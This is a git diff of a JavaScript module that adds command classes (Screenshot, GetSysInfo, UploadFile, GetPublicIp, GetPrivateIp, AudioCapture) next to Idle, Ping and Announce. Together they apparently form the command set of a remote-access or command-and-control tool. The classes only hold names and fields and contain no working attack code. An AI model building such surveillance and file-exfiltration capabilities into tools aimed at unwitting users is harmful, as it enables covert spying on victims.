@@ -4,8 +4,6 @@ class Command {
     constructor(name) {
         this.name = name
     }
-
-
 }
 
 
@@ -32,5 +30,50 @@ class Announce extends Command {
     }
 }
 
+class Screenshot extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "Screenshot"
+    }
+}
 
-module.exports = {Command, Idle, Ping, Announce}
+class GetSysInfo extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "GetSysInfo"
+    }
+}
+
+class UploadFile extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "UploadFile"
+        this.path = props.path
+    }
+}
+
+class GetPublicIp extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "GetPublicIp"
+    }
+}
+
+class GetPrivateIp extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "GetPrivateIp"
+    }
+}
+
+class AudioCapture extends Command {
+    constructor(props) {
+        super(props);
+        this.name = "AudioCapture"
+        this.length = props.length
+        this.path = props.path
+    }
+}
+
+
+module.exports = {Command, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture}
